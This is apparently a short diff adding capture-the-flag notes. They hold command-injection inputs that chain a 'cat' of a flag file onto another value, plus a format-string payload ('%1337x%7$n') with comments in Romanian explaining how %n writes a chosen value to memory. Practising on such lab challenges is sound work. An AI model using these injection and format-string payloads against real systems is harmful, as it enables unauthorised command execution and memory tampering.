@@ -1,0 +1,7 @@
+flag1: `cat ctf1.txt`&(ls)
+asd;cat ctf1.txt;echo
+
+'%1337x%7$n'
+
+%1337x pune 1337 caractere, 7$ - al catelea parametru sa il ia
+%n - scrie numarul de caractere scrise pana atunci
